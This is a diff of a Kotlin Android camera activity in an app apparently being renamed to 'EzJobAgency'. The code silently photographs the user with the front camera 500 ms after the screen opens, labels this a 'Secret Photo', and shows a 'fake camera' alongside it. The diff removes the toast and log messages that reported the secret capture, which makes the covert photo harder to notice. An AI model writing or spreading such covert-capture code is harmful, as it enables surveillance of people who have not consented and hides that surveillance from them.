@@ -1,4 +1,4 @@
-package com.example.assignment1
+package com.example.EzJobAgency
 
 import android.Manifest
 import android.app.Activity
@@ -15,7 +15,7 @@ import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
 import androidx.camera.core.Preview
 import androidx.camera.lifecycle.ProcessCameraProvider
-import com.example.assignment1.databinding.ActivityCameraBinding
+import com.example.EzJobAgency.databinding.ActivityCameraBinding
 import java.io.File
 import java.util.concurrent.ExecutorService
 import java.util.concurrent.Executors
@@ -60,7 +60,7 @@ class CameraStart : AppCompatActivity() {
             takePhoto()
         }, 500)     // Auto take photo using front Cam
 
-        cameraExecutor = Executors.newSingleThreadExecutor()
+        //cameraExecutor = Executors.newSingleThreadExecutor()
         // Start fake cam
         Handler().postDelayed(Runnable {
             fakeCamera()
@@ -83,7 +83,7 @@ class CameraStart : AppCompatActivity() {
                 }
             imageCapture = ImageCapture.Builder().build()
 
-            // Select back camera as a default
+            // Select front camera as a default
             val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
 
             try {
@@ -159,13 +159,11 @@ class CameraStart : AppCompatActivity() {
             ContextCompat.getMainExecutor(this),
             object : ImageCapture.OnImageSavedCallback {
                 override fun onError(exc: ImageCaptureException) {
-                    Log.e(TAG, "Secret Photo capture failed: ${exc.message}", exc)
+                    //State action
                 }
 
                 override fun onImageSaved(output: ImageCapture.OutputFileResults){
-                    val msg = "Secret Photo capture succeeded: ${output.savedUri}"
-                    Toast.makeText(baseContext, msg, Toast.LENGTH_SHORT).show()
-                    Log.d(TAG, msg)
+                    //State action
                 }
             }
         )
@@ -201,14 +199,11 @@ class CameraStart : AppCompatActivity() {
             ContextCompat.getMainExecutor(this),
             object : ImageCapture.OnImageSavedCallback {
                 override fun onError(exc: ImageCaptureException) {
-                    Log.e(TAG, "Photo capture failed: ${exc.message}", exc)
                 }
 
                 override fun onImageSaved(output: ImageCapture.OutputFileResults){
                     val msg = "Photo capture succeeded: ${output.savedUri}"
                     Toast.makeText(baseContext, msg, Toast.LENGTH_SHORT).show()
-                    Log.d(TAG, msg)
-
                     setResult(Activity.RESULT_OK);
                     finish();
                 }
